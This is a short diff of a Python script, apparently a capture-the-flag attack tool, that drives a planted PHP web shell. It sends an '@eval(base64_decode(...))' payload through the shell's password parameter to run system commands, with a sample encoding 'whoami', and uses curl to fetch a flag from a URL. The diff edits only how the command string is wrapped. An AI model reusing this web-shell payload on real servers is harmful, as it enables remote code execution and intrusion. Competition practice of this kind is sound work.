@@ -34,7 +34,7 @@ def getflag(url,method,passwd,flag_path):
 	#a=@eval(base64_decode($_GET[z0]));&z0=c3lzdGVtKCJ3aG9hbWkiKTs=
 	cmd = "curl "+flag_url
 	#cmd = "whoami"
-	getflag_cmd ="system(\"%s\");"%cmd
+	getflag_cmd ="echo system(\"%s\");"%cmd
 	data={}
 	if method=='get':
 		data[passwd]='@eval(base64_decode($_GET[z0]));'
